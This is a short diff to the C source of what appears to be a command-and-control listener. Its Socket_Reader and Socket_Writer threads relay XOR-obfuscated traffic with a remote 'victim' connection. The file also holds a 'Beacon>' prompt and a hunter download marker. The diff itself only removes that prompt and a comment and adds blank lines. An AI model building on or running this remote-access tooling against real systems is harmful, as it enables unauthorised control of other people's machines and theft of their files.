@@ -106,8 +106,6 @@ void *Socket_Reader(){
 
     fflush(NULL);
     while (a.kill == 0 && (n = read(a.dest, buffer, MAXBUF)) > 0) {
-	
-	if(a.kill == 0){printf("Beacon> ");}
 
 	xorbuffer = XOR(buffer, key, n, keylen);
 	if(strcmp(xorbuffer, "--HUNTER DOWNLOAD--") == 0){
@@ -121,8 +119,10 @@ void *Socket_Reader(){
 
         if (write(STDOUT_FILENO, xorbuffer, n) < 0)  // writes data from victim fd to stdout
             printf("Error in function write()\n");
+
         fflush(NULL);
         fflush(NULL);
+
 	free(xorbuffer);
     }
 
@@ -145,9 +145,8 @@ void *Socket_Writer()
     int n;
     char buffer[MAXBUF];
 
-    while (a.kill == 0 && (n = read(a.src, buffer, MAXBUF)) > 0) // reads from the stdin file descriptor and executes code if it's contents are above 0. a.src is passed the stdin fd on line 122
+    while (a.kill == 0 && (n = read(a.src, buffer, MAXBUF)) > 0)
     {
-	
 
         if (strcmp(newline_terminator(buffer), "bg\n") == 0) {
 	    
